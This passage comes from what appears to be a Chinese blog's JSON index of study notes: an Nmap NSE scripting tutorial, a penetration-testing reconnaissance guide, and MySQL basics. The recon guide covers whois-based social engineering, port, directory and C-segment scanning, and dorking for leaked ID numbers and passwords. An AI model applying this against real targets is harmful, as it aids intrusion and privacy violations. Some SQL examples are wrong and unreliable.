port)\nend\nNSE脚本的规则你可以发现上述rule字段是portrule，NSE脚本的执行规则是和nmap的扫描相结合的，两者执行的先后顺序目前有如下4种。\n\nprerule()：规则早于nmap的扫描，执行的顺序是先执行脚本，后nmap扫描。\nhostrule()：nmap完成了主机发现之后运行脚本。\nportrule()：nmap执行了端口扫描后运行脚本。\npostrule()：nmap完成所有的扫描后才执行脚本。\n\n编写简单的NSE脚本\n如：编写一个简单的脚本来探测目标是否开放了80端口，并且这个端口运行的是HTTP服务，如果是nmap输出“This is a WebServer”。那么在前面脚本demo代码的基础上，我们只需修改portrule函数的代码和让action函数来输出。代码逻辑先portrule判断条件是否成立：“目标是否开放了80端口，服务是否是HTTP”，是返回true不是返回false，代码实现：\nportrule &#x3D; function(host,port)\n    return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 80 and port.service &#x3D;&#x3D;&quot;http&quot; and port.state &#x3D;&#x3D;&quot;open&quot;\nend\n\n如果返回true：执行action，输出“This is a WebServer”：\naction &#x3D; function(host, port)\nreturn &quot;This is a WebServer&quot;\nend\n\n完整的代码：\nlocal shortport &#x3D; require &quot;shortport&quot;\ndescription &#x3D; [[a http service detect test demo]]\n\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\n\nportrule &#x3D; function(host,port)\n    return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 80 and port.service &#x3D;&#x3D;&quot;http&quot; and port.state &#x3D;&#x3D;&quot;open&quot;\nend\n\naction &#x3D; function(host, port)\nreturn &quot;This is a WebServer&quot;\nend\n\n将上述代码命名为http-detect-test.nse保存在scripts目录下，然后执行nmap --script-updatedb更新nse脚本。\n接着在nmap中执行http-detect-test.nse这个脚本：nmap -p 80 10.10.10.39 --script http-detect-test\nPORT   STATE SERVICE\n\n80&#x2F;tcp open  http\n\n|_http-detect-test: This is a WebServer\n\n另外，如果执行过程，脚本有错误，可以在nmap命令中加入-d来获得调试中的数据。其中-d后面可以添加数字1 2 3 4代表详细级别,可以看到程序的每一步执行过程;\nNSE中的API你可能会对上面脚本中portrule规则判断扫描结果的代码心存疑惑，实际上那个位置调用了nmap扫描结果的API。\nNmap中的API的核心功能就是向脚本提供关于主机和端口的信息，例如名字解析、主机和端口的状态、服务发现等内容。此处介绍一部分常用的的API调用和代码demo供给大家参考使用。\n两个Lua table 类型的参数\n\nhost table\nport table\n\nhost table1. host.os获取nmap扫描到的操作系统信息。\n\nvendor 供应商\nosfamily 所属系列\nosgen 具体型号\ntype 设备类型\nCPE\n\nlocal shortport &#x3D; require &quot;shortport&quot;\n\ndescription &#x3D; [[test api]]\n\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\n\nhostrule &#x3D; function( host, port )\n    return true\nend\n\naction &#x3D; function(host, port)\n    return host.os\nend\n\n扫描命令：nmap -O 10.10.10.39 --script my-api-test\nHost script results:\n| my-api-test:\n|\n|     name: Linux 2.6.13 - 2.6.32\n|     classes:\n|\n|         type: general purpose\n|         vendor: Linux\n|         osgen: 2.6.X\n|         osfamily: Linux\n|         cpe:\n|_          cpe:&#x2F;o:linux:linux_kernel:2.6\n\n2. host.ip将host.os那段脚本的第14行改为return host.ip。\n扫描命令：nmap www.baidu.com --script my-api-test\nHost script results:\n|_my-api-test: 14.215.177.38\n\n3.host.name将host.os那段脚本的第14行改为return host.name。\n扫描命令：nmap www.baidu.com --script my-api-test\nHost script results:\n|_my-api-test: 14.215.177.38\n\n4.host.targetname目标主机在命令行的名字。\n5.host.directly_connected表示目标计算机是否与我们同在一个子网。\n6.host.name将host.os那段脚本的第14行改为return host.mac_addr。\n扫描命令：nmap 10.10.10.39 --script my-api-test 必须是同一子网的设备这个命令才有效。\nHost script results:\n|_my-api-test: \\x00\\x0C)f\\xF4\\xDF\n\n7.host.traceroute将host.os那段脚本的第14行改为return host.traceroute。\n扫描命令：nmap --traceroute www.baidu.com --script my-api-test\nHost script results:\n| my-api-test:\n|\n|     times:\n|       srtt: 0.002\n|     ip: 192.168.1.1\n|\n|     times:\n|       srtt: 0.004\n|     ip: 192.168.12.1\n|\n|     times:\n|       srtt: 0.002\n|     ip: 192.168.200.1\n|\n|     name: 78.228.84.110.broad.fz.fj.dynamic.163data.com.cn\n|     ip: 110.84.228.78\n|     times:\n|       srtt: 0.002\n|\n|     times:\n|       srtt: 0.017\n|     ip: 113.96.4.70\n|\n|     times:\n|       srtt: 0.017\n|_    ip: 14.215.177.39\n\nport table1. port.numberlocal shortport &#x3D; require &quot;shortport&quot;\n\ndescription &#x3D; [[test api]]\n\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\nportrule &#x3D; function( host, port )\n    return true\nend\n\naction &#x3D; function(host, port)\n    return port.number\nend\n\n扫描命令：nmap www.baidu.com --script my-api-test\nPORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: 80\n443&#x2F;tcp open  https\n|_my-api-test: 443\n\n2. port.protocolPORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: tcp\n443&#x2F;tcp open  https\n|_my-api-test: tcp\n\n3. port.servicePORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: http\n443&#x2F;tcp open  https\n|_my-api-test: https\n\n4. port.versionPORT    STATE SERVICE\n80&#x2F;tcp  open  http\n| my-api-test:\n|   name_confidence: 3.0\n|   service_tunnel: none\n|   name: http\n|   service_dtype: table\n|_  cpe:\n443&#x2F;tcp open  https\n| my-api-test:\n|   name_confidence: 3.0\n|   service_tunnel: none\n|   name: https\n|   service_dtype: table\n|_  cpe:\n\n5.port.statePORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: open\n443&#x2F;tcp open  https\n|_my-api-test: open","slug":"Nmap扫描基础","date":"2022-11-16T14:30:24.497Z","categories_index":"在线笔记","tags_index":"工具","author_index":"Abyssaler"},{"id":"4b515816a6e960006dfc09050d5893fe","title":"渗透测试之信息收集","content":"信息收集–渗透测试的灵魂信息收集需要收集哪些内容？为什么要收集这些？1.whois信息什么是whois？​\t whois 指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱\n为什么要收集whois?​\t域名注册人可能就是网站管理员，可以尝试社工、套路，查询是不是注册了其他域名扩大功击范围。\n如何收集whois信息？\n\n\n\n\n\n\n\n\n\nhttp://whois.chinaz.com/ (站长之家)\nhttps://whois.com \nhttps://www.bugku.com/mima/\n如图,通过域名查询,发现了注册人的邮箱,通过这个邮箱我们可以进行进一步的社工等\n\n在搜索引擎搜索此邮箱\n\n没有发现有价值的信息,但可以确定查询目标的qq号,以后对该目标生成社工字典时也可以参考,同时还能借助qq号发起社工\n\n\n\n\n\n\n\n\n\nhttps://www.bugku.com/mima/ (社工密码生成)\n进一步查询企业的名字\n\n通过各种企业查询类app:\n\n\n\n\n\n\n\n\n\nhttps://www.qcc.com/\nhttps://www.qixin.com/\nhttps://aiqicha.baidu.com/\n2.子域名什么是子域名?顶级域名下的二级域名或者三级甚至更多级的域名都属于子域名，有一些直接ip访问的WEB站也归结于子域名收集范围\nxxx.com（顶级域名）\nxxx.xxx.com（二级域名）\nxxx.xxx.xxx.com（三级域名）\n为什么要收集?子域名可以扩大攻击范围，同一个域名下的二级域名都属于相同资产，一般而言都有相关的联系\n\n\n\n\n\n\n\n\n\n查子域名的网站\nhttps://chaziyu.com/ \nhttps://www.ipbuf.com/Subdomain.html\nhttps://www.dnsgrep.cn/\n\n其他工具\nlayer\n如何收集子域名？\nGoogle语法（见后面）\n网页蜘蛛爬虫\nDNS爆破法\n\n3.端口收集为什么要探测端口？ 有些危险端口开放了我们就可以尝试入侵，例如 445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站\n如何探测端口？ 主要是Nmap扫描工具\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/weixin_42248871/article/details/120981520\nhttps://xbxaq.com/doc/99/\n或者站内搜索nmap\n扫描内网示例，扫描出内网的主机\n\n4.目录扫描为什么要扫描目录？有些网站可能某个目录下是一个新的网站，有的时候目录扫描直接下载了压缩包源码、编辑器目录、一些废弃的页面（会报错）\n如何扫描？御剑目录扫描工具，7k\n7k扫描示例\n\n\n通过目录扫描就进入了后台登录页面了\nrobots协议：robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照，如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。\n\nrobots文件对于渗透测试的意义？  可以让我们知道该网站下有哪些目录\n5.指纹识别为什么要指纹识别？ cms可能存在漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击\n什么是cms？内容管理系统（Content Management System，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。\n随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。 \n内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。对于内容管理，业界还没有一个统一的定义，不同的机构有不同的理解。\n常用的cms有哪些？1.企业建站系统：MetInfo(米拓)、蝉知、SiteServer CMS等;点击下载整站源码\n2.B2C商城系统：商派shopex、ecshop、hishop、xpshop等;点击免费试用商城系统\n3.门户建站系统：DedeCMS(织梦)、帝国CMS、PHPCMS、动易、cmstop等;点击查看网站模板\n4.博客系统：wordpress、Z-Blog等;点击查看建站教程\n5.论坛社区：discuz、phpwind、wecenter等;\n6.问题系统：Tipask、whatsns等; 点击查看问题社区\n7.知识百科系统：HDwiki;点击查看网站案例\n8.B2B门户系统：destoon、B2Bbuilder、友邻B2B等;\n9.人才招聘网站系统：骑士CMS、PHP云人才管理系统;\n10.房产网站系统：FangCms等;\n11.在线教育建站系统：kesion(科汛)、EduSoho网校;\n12.电影网站系统：苹果cms、ctcms、movcms等;\n13.小说文学建站系统：JIEQI CMS;\n如何进行指纹识别？一般可以在网页下面找到cms\n\n如果作者隐藏了这些内容，那么就可以用下面这些网站进行识别\n 主要使用在线网站工具进行指纹识别\n\n\n\n\n\n\n\n\n\nhttps://www.yunsee.cn/\nhttp://finger.tidesec.net/\nhttp://whatweb.bugscaner.com/look/\nhttps://s.threatbook.cn/\n6.旁站查询为什么要查询旁站？旁站指的是在同一个ip上面的多个网站，如果你成功拿下旁站，运气好和主站在同一台机器上，是不是就是拿到了主站？ 如果运气不好是一个内网，我们是不是可以尝试内网渗透\n一般而言,网站的主站防护性较强,我们可以通过信息收集到旁站的信息,通过这些站点拿到权限,就有可能拿下ip\n如何查询旁站？\n\n\n\n\n\n\n\n\nhttps://stool.chinaz.com/same\nhttps://www.webscan.cc/\n7.C端扫描C段是什么|为什么要扫描？C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。\n例如192.168.1.1 ,那么192.168.1.1-192.168.1.255 都属于同一个C段，有些学校或者大公司，他们会持有整个IP段，这个ip段中所有的ip都是那个公司的资产，拿下一台可能有有用的信息，可能在同一内网\n确定ip的范围，然后对其段内的Ip主机进行信息收集\n\n\n\n\n\n\n\n\n\nhttps://www.webscan.cc/\n8.内容敏感信息泄露尝试Google语法，找到某些敏感内容，比如包含身份证号码的表格、包含服务器账号密码的文件、某些敏感文件、备份数据库\n\n\n\n\n\n\n\n\n\n\n谷歌镜像站： https://search.ahnu.cf/\nGoogle镜像站地址发布: http://429006.com/article/technology/3810.htm\nGoogle语法详解: https://blog.csdn.net/qq_50589021/article/details/115377111\n\n然后利用查到的敏感信息做社工(过于敏感不便展示)\n9.网络空间搜索引擎(基于物联网搜索，搜索联网的网络设备)网络空间搜索引擎是为了解决个人每次进行渗透测试是都要进行的信息收集过程，通过全网扫描的方式，将基础数据进行格式化存储，供安全人员按需搜索使用，提升了安全人员的工作效率。网络空间搜索引擎的作用就是将互联网上公开的网络资产收集和整理，以此方便人们进行查阅和利用\n网络空间搜索引擎的使用:\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/articles/web/334566.html\nhttps://www.freebuf.com/sectool/308478.html\nhttps://blog.csdn.net/whatday/article/details/84976435\n常用的网络空间搜索引擎：fofa、shodan、zoomeye、censys:\n\n\n\n\n\n\n\n\n\n钟馗之眼: http://www.zoomeye.org\nShodan: https://www.shodan.io\nfofa: https://fofa.info/\n\n","slug":"渗透测试之信息搜集（持续更新）","date":"2022-11-16T13:20:15.829Z","categories_index":"学习笔记","tags_index":"渗透测试","author_index":"Abyssaler"},{"id":"fb8cab7394f8a5dac8ef147ae6234738","title":"MYSQL在线笔记1","content":"mysql0.数据库常见概念0.1概念数据库：        英文单词DataBase，简称DB。按照一定格式存储数据的一些文件的组合。        顾名思义：存储数据的仓库，实际上就是一堆文件。这些文件中存储了        具有特定格式的数据。\n数据库管理系统：    DataBaseManagement，简称DBMS。    数据库管理系统是专门用来管理数据库中数据的，数据库管理系统可以    对数据库当中的数据进行增删改查。\n常见的数据库管理系统：    MySQL、Oracle、MS SqlServer、DB2、sybase等….\nSQL：结构化查询语言    程序员需要学习SQL语句，程序员通过编写SQL语句，然后DBMS负责执行SQL    语句，最终来完成数据库中数据的增删改查操作。\nSQL是一套标准，程序员主要学习的就是SQL语句，这个SQL在mysql中可以使用，同时在Oracle中也可以使用，在DB2中也可以使用。\n三者之间的关系？    DBMS–执行–&gt; SQL –操作–&gt; DB\n先安装数据库管理系统MySQL，然后学习SQL语句怎么写，编写SQL语句之后，DBMS对SQL语句进行执行，最终来完成数据库的数据管理。\n0.2 SQL语句分类DQL：        数据查询语言（凡是带有select关键字的都是查询语句）        select…\t\t\nDML：            数据操作语言（凡是对表当中的数据进行增删改的都是DML）            insert delete update            insert 增            delete 删            update 改\n​\t\t这个主要是操作表中的数据data。\nDDL：        数据定义语言        凡是带有create、drop、alter的都是DDL。        DDL主要操作的是表的结构。不是表中的数据。        create：新建，等同于增        drop：删除        alter：修改        这个增删改和DML不同，这个主要是对表结构进行操作。\nTCL：    不是王牌电视。    是事务控制语言    包括：        事务提交：commit;        事务回滚：rollback;\nDCL：    是数据控制语言。    例如：授权grant、撤销权限revoke….\n0.3MYSQL中的数据类型varchar(最长255)        可变长度的字符串，比较智能，节省空间。会根据实际的数据长度动态分配空间。\n​\t\t优点：节省空间​\t\t缺点：需要动态分配空间，速度慢。\nchar(最长255)        定长字符串，不管实际的数据长度是多少，分配固定长度的空间去存储数据。        使用不恰当的时候，可能会导致空间的浪费。\n​\t\t优点：不需要动态分配空间，速度快。​\t\t缺点：使用不当可能会导致空间的浪费。\n​\t\tvarchar和char我们应该怎么选择？​\t\t\t性别字段你选什么？因为性别是固定长度的字符串，所以选择char。​\t\t\t姓名字段你选什么？每一个人的名字长度不同，所以选择varchar。\nint(最长11)\n​\t\t数字中的整数型。等同于java的int。\nbigint        数字中的长整型。等同于java中的long。\nfloat        单精度浮点型数据\ndouble        双精度浮点型数据\ndate        短日期类型\ndatetime        长日期类型\nclob        字符大对象        最多可以存储4G的字符串。        比如：存储一篇文章，存储一个说明。        超过255个字符的都要采用CLOB字符大对象来存储。        Character Large OBject:CLOB\nblob        二进制大对象        Binary Large OBject        专门用来存储图片、声音、视频等流媒体数据。        往BLOB类型的字段上插入数据的时候，例如插入一个图片、视频等，        你需要使用IO流才行。\nt_movie 电影表（专门存储电影信息的）\n编号no(bigint)\t名字name(varchar)\t\t故事情节history(clob)\t\n上映日期playtime(date)\t\t时长time(double)\t\t海报image(blob)\n类型type(char)\t\t\t\t\t\t\t\n\n0.4SQL脚本的执行xxxx.sql这种文件被称为sql脚本文件。        sql脚本文件中编写了大量的sql语句。        我们执行sql脚本文件的时候，该文件中所有的sql语句会全部执行！        批量的执行SQL语句，可以使用sql脚本文件。\n\nmysql&gt; source D:\\course\\03-MySQL\\document\\vip.sql你在实际的工作中，第一天到了公司，项目经理会给你一个xxx.sql文件，你执行这个脚本文件，你电脑上的数据库数据就有了！\n\n0.5数据库和表的导入导出数据导出？\n\t注意：在windows的dos命令窗口中：\n\t\tmysqldump bjpowernode&gt;D:\\bjpowernode.sql -uroot -p123456\n\t可以导出指定的表吗？\n\t\tmysqldump bjpowernode emp&gt;D:\\bjpowernode.sql -uroot -p123456\n\n数据导入？\n\t注意：需要先登录到mysql数据库服务器上。\n\t然后创建数据库：create database bjpowernode;\n\t使用数据库：use bjpowernode\n\t然后初始化数据库：source D:\\bjpowernode.sql\n\n1.数据库操作show databases; \t查看mysql中有哪些数据库\n use test;\t表示正在使用一个名字叫做test的数据库。\n create database db01;\t创建数据库\nshow tables; \t查看某个数据库下有哪些表\n select version();\t查看mysql数据库的版本号\nselect database();\t查看当前使用的是哪个数据库\n\\c\t用来终止一条命令的输入。\n2.建表操作2.1创建一个表create学号、姓名、年龄、性别、邮箱地址\n\tcreate table t_student(\n\t\tno int,\n\t\tname varchar(32),\n\t\tsex char(1),\n\t\tage int(3),\n\t\temail varchar(255)\n\t);\n\n2.2删除一个表dropdrop table t_student; &#x2F;&#x2F; 当这张表不存在的时候会报错！\n&#x2F;&#x2F; 如果这张表存在的话，删除\ndrop table if exists t_student;\n\n\n对表结构的修改需要使用：alter属于DDL语句\ndesc t_student    查看表结构\n\n2.3插入数据insert\ninsert into 表名(字段名1,字段名2,字段名3…) values(值1,值2,值3);\n\ninsert into t_student(no,name,sex,age,email)\n\tvalues(1,&#39;zhangsan&#39;,&#39;m&#39;,20,&#39;zhangsan@123.com&#39;);\ninsert into t_student(email,name,sex,age,no)\n\tvalues(&#39;lisi@123.com&#39;,&#39;lisi&#39;,&#39;f&#39;,20,2);\ninsert into t_student(no) values(3);\n&#x2F;&#x2F;省略字段名\ninsert into t_student values(2, &#39;lisi&#39;, &#39;f&#39;, 20, &#39;lisi@123.com&#39;);\n\n\ninsert语句但凡是执行成功了，那么必然会多一条记录。没有给其它字段指定值的话，默认值是NULL。\n\n一次插入多条数据\n\ninsert into t_user(字段名1,字段名2) values(),(),(),();\n\ninsert into t_user(id,name,birth,create_time) values\n\t\t(1,&#39;zs&#39;,&#39;1980-10-11&#39;,now()), \n\t\t(2,&#39;lisi&#39;,&#39;1981-10-11&#39;,now()),\n\t\t(3,&#39;wangwu&#39;,&#39;1982-10-11&#39;,now());\n\n\n\n2.4修改数据update\nupdate 表名 set 字段名1&#x3D;值1,字段名2&#x3D;值2,字段名3&#x3D;值3… where 条件;\n\n没有条件限制会导致所有数据全部更新。\n\n\nupdate t_user set name &#x3D; &#39;jack&#39;, birth &#x3D; &#39;2000-10-11&#39; where id &#x3D; 2;\n\nupdate t_user set name &#x3D; &#39;jack&#39;, birth &#x3D; &#39;2000-10-11&#39;, create_time &#x3D; now() where id &#x3D; 2;\n\n2.5删除数据delete语句删除数据的原理？（delete属于DML语句！！！）\n\n表中的数据被删除了，但是这个数据在硬盘上的真实存储空间不会被释放！！！\n这种删除缺点是：删除效率比较低。\n这种删除优点是：支持回滚，后悔了可以再恢复数据！！！\n\ntruncate语句删除数据的原理？\n\n这种删除效率比较高，表被一次截断，物理删除。\n这种删除缺点：不支持回滚。\n这种删除优点：快速。\n\n2.5.1delete\ndelete from 表名 where 条件;\n\n没有条件，整张表的数据会全部删除！\n\ndelete from t_user where id &#x3D; 2;\n\n\n2.5.2truncate\ntruncate table dept_bak; （这种操作属于DDL操作。）\n\n下列演示内容所用表\nemp 员工表\n\nsalgarde 工资等级表\n\ndept 部门表\n\n3.基础增删改3.单表查询3.1基础条件查询\nselect  字段1,字段2,字段3….  from   表名  where  条件;\n\n&#x3D; 等于\n查询薪资等于800的员工姓名和编号？\n\t\tselect empno,ename from emp where sal &#x3D; 800;\n\t查询SMITH的编号和薪资？\n\t\tselect empno,sal from emp where ename &#x3D; &#39;SMITH&#39;; &#x2F;&#x2F;字符串使用单引号\n\n&lt;&gt;或!&#x3D; 不等于\n查询薪资不等于800的员工姓名和编号？\n\tselect empno,ename from emp where sal !&#x3D; 800;\n\tselect empno,ename from emp where sal &lt;&gt; 800; &#x2F;&#x2F; 小于号和大于号组成的不等号\n\n&lt; 小于  &lt;&#x3D; 小于等于\n查询薪资小于等于3000的员工姓名和编号？\n\t\tselect empno,ename,sal from emp where sal &lt;&#x3D; 3000;\n\n(&gt;)大于 **  ** (&gt;&#x3D;) 大于等于\n查询薪资大于等于3000的员工姓名和编号？\nselect empno,ename,sal from emp where sal &gt;&#x3D; 3000;\n\nbetween … and …. 两个值之间, 等同于 &gt;&#x3D; and &lt;&#x3D;\n查询薪资在2450和3000之间的员工信息？包括2450和3000\n\t第一种方式：&gt;&#x3D; and &lt;&#x3D; （and是并且的意思。）\n\t\tselect empno,ename,sal from emp where sal &gt;&#x3D; 2450 and sal &lt;&#x3D; 3000;\t\n\nis null 为 null（is not null 不为空）\n查询哪些员工的津贴&#x2F;补助为null？\n\t\tmysql&gt; select empno,ename,sal,comm from emp where comm &#x3D; null;\n\n查询哪些员工的津贴&#x2F;补助不为null？\n\t\tselect empno,ename,sal,comm from emp where comm is not null;\n\nand 并且    or 或者\nselect  * from emp where sal &gt; 2500 and (deptno &#x3D; 10 or deptno &#x3D; 20);\n\nand和or同时出现，and优先级较高。如果想让or先执行，需要加“小括号”,以后在开发中，如果不确定优先级，就加小括号就行了。\n\nin 包含，相当于多个 or （not in 不在这个范围中）\n查询工作岗位是MANAGER和SALESMAN的员工？\nselect empno,ename,job from emp where job &#x3D; &#39;MANAGER&#39; or job &#x3D; &#39;SALESMAN&#39;;\nselect empno,ename,job from emp where job in(&#39;MANAGER&#39;, &#39;SALESMAN&#39;);\n\nnot 可以取非，主要用在 is 或 in 中\nis null\nis not null\nin\nnot in\n\nlike \t\n称为模糊查询，支持%或下划线匹配\n\n%匹配任意多个字符\n下划线：任意一个字符。\n（%是一个特殊的符号，_ 也是一个特殊符号）\n\n\t\n\n找出名字中含有O的？\n\tmysql&gt; select ename from emp where ename like &#39;%O%&#39;;\n\n找出名字中有“_”的？\n\tselect name from t_student where name like &#39;%_%&#39;; &#x2F;&#x2F;这样不行。\n\n\tmysql&gt; select name from t_student where name like &#39;%\\_%&#39;; &#x2F;&#x2F; \\转义字符。\n\ndistinct\n\n把查询结果去除重复记录【distinct】\n\ndistinct只能出现在所有字段的最前方。\n\ndistinct出现在job,deptno两个字段之前，表示两个字段联合起来去重。\n\nselect distinct job from emp;\n\nselect distinct job,deptno from emp;\n\n\n3.2排序查询所有员工薪资，排序？\n\nselect  ename,sal from emp order by sal; &#x2F;&#x2F; 默认是升序！！！\n\n指定降序：desc\n\nselect  ename,sal from emp order by sal desc;\n\n查询员工名字和薪资，要求按照薪资升序，如果薪资一样的话，\n\t再按照名字升序排列。\n\tselect \n\t\tename,sal\n\tfrom\n\t\temp\n\torder by\n\t\tsal asc, ename asc; &#x2F;&#x2F; sal在前，起主导，只有sal相等的时候，才会考虑启用ename排序。\n\n3.3分页\nlimit作用：将查询结果集的一部分取出来。通常使用在分页查询当中。\n完整用法：limit startIndex, length\t\tstartIndex是起始下标，length是长度。\n起始下标从0开始。\n缺省用法：limit 5; 这是取前5.\n\n\n\n按照薪资降序，取出排名在前5名的员工？\nselect \n\t\tename,sal\n\tfrom\n\t\temp\n\torder by \n\t\tsal desc\n\tlimit 5; &#x2F;&#x2F;取前5\tlimit 0,5;\nmysql当中limit在order by之后执行！！！！！！\n\n取出工资排名在[3-5]名的员工？\n\tselect \n\t\tename,sal\n\tfrom\n\t\temp\n\torder by\n\t\tsal desc\n\tlimit\n\t\t2, 3;\n2表示起始位置从下标2开始，就是第三条记录。\n3表示长度。\n\n\n每页显示3条记录\n\n第1页：limit 0,3\t\t[0 1 2]\n第2页：limit 3,3\t\t[3 4 5]\n第3页：limit 6,3\t\t[6 7 8]\n\n\n每页显示pageSize条记录\n\n第pageNo页：limit (pageNo - 1) * pageSize  , pageSize\n\n\n\n4.函数4.1单行处理函数\n单行处理函数的特点：一个输入对应一个输出。\n和单行处理函数相对的是：多行处理函数。（多行处理函数特点：多个输入，对应1个输出！）\n\n\n\nlower 转换小写\n\tmysql&gt; select lower(ename) as ename from emp;\nupper 转换大写\n\t\tmysql&gt; select * from t_student;\nsubstr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）\n\t\tselect substr(ename, 1, 1) as ename from emp;\n\t\t注意：起始下标从1开始，没有0.\n\t\t找出员工名字第一个字母是A的员工信息？\n\t\t\t第一种方式：模糊查询\n\t\t\t\tselect ename from emp where ename like &#39;A%&#39;;\n\t\t\t第二种方式：substr函数\n\t\t\t\tselect \n\t\t\t\t\tename \n\t\t\t\tfrom \n\t\t\t\t\temp \n\t\t\t\twhere \n\t\t\t\t\tsubstr(ename,1,1) &#x3D; &#39;A&#39;;\nconcat函数进行字符串的拼接\n\t\tselect concat(empno,ename) from emp;\nlength 取长度\n\t\tselect length(ename) enamelength from emp;\ntrim 去空格\n\t\tmysql&gt; select * from emp where ename &#x3D; &#39;  KING&#39;;\nstr_to_date 将字符串转换成日期\ndate_format 格式化日期\nformat 设置千分位\nround 四舍五入\n\t\tselect 字段 from 表名;\n\t\tselect ename from emp;\n\t\tselect &#39;abc&#39; from emp; &#x2F;&#x2F; select后面直接跟“字面量&#x2F;字面值”\n\n\t\tmysql&gt; select &#39;abc&#39; as bieming from emp;\n\t\tselect round(1236.567, 1) as result from emp; &#x2F;&#x2F;保留1个小数\n\t\tselect round(1236.567, 2) as result from emp; &#x2F;&#x2F;保留2个小数\n\t\tselect round(1236.567, -1) as result from emp; &#x2F;&#x2F; 保留到十位。\nrand() 生成随机数\n\t\tmysql&gt; select round(rand()*100,0) from emp; &#x2F;&#x2F; 100以内的随机数\nifnull 可以将 null 转换成一个具体值\n\t\tifnull是空处理函数。专门处理空的。\n\t\t在所有数据库当中，只要有NULL参与的数学运算，最终结果就是NULL。\n\t\tmysql&gt; select ename, sal + comm as salcomm from emp;\n\n4.2分组函数\n多行处理函数的特点：输入多行，最终输出一行。\ncount\t计数\nsum\t求和\navg\t平均值\nmax\t最大值\nmin\t最小值\n\n\n注意：分组函数在使用的时候必须先进行分组，然后才能用。如果你没有对数据进行分组，整张表默认为一组。\n\n\t\n找出最高工资？\n\t\tmysql&gt; select max(sal) from emp;\n找出最低工资？\n\t\tmysql&gt; select min(sal) from emp;\n计算工资和：\n\t\tmysql&gt; select sum(sal) from emp;\n计算平均工资：\n\t\tmysql&gt; select avg(sal) from emp;\n计算员工数量？\n\t\tmysql&gt; select count(ename) from emp;\n\n分组函数在使用的时候需要注意哪些？\t\n\n第一点：分组函数自动忽略NULL，你不需要提前对NULL进行处理。\n第二点：分组函数中count()和count(具体字段)有什么区别？\ncount(具体字段)：表示统计该字段下所有不为NULL的元素的总数。\ncount(*)：统计表当中的总行数。（只要有一行数据count则++）            因为每一行记录不可能都为NULL，一行数据中有一列不为NULL，则这行数据就是有效的。\n\n\n第三点：分组函数不能够直接使用在where子句中。        找出比最低工资高的员工信息。              select ename,sal from emp where sal &gt; min(sal);              表面上没问题，运行一下？                  ERROR 1111 (HY000): Invalid use of group function\n\n5.分组查询5.1 group by找出每个工作岗位的工资和？\n\t实现思路：按照工作岗位分组，然后对工资求和。\n\t\tselect \n\t\t\tjob,sum(sal)\n\t\tfrom\n\t\t\temp\n\t\tgroup by\n\t\t\tjob;\n以上这个语句的执行顺序？\n先从emp表中查询数据。根据job字段进行分组。然后对每一组的数据进行sum(sal)\n\n\n在一条select语句当中，如果有group by语句的话，select后面只能跟：参加分组的字段，以及分组函数。其它的一律不能跟。**\n\n找出每个部门的最高薪资\n实现思路:按照部门编号分组，求每一组的最大值。\n\tmysql&gt; select deptno,max(sal) from emp group by deptno;\n\n5.2 联合分组找出“每个部门，不同工作岗位”的最高薪资？\n技巧：两个字段联合成1个字段看。（两个字段联合分组）\n\t\tselect \n\t\t\tdeptno, job, max(sal)\n\t\tfrom\n\t\t\temp\n\t\tgroup by\n\t\t\tdeptno, job;\n\n\n\n5.3having\n使用having可以对分完组之后的数据进一步过滤。\n\nhaving不能单独使用，having不能代替where，having必须和group by联合使用。\n\n\n找出每个部门平均薪资，要求显示平均薪资高于2500的。\nselect \n\tdeptno,avg(sal) \nfrom \n\temp \ngroup by \n\tdeptno\nhaving\n\tavg(sal) &gt; 2500;\n\n\nwhere和having，优先选择where，where实在完成不了了，再选择having。\n\n5.4总结sql执行顺序\nselect  –&gt; from –&gt; where –&gt; group by –&gt; having –&gt; order by –&gt;以上关键字只能按照这个顺序来，不能颠倒。\n\n执行顺序？    1. from –&gt; where –&gt; group by –&gt; having 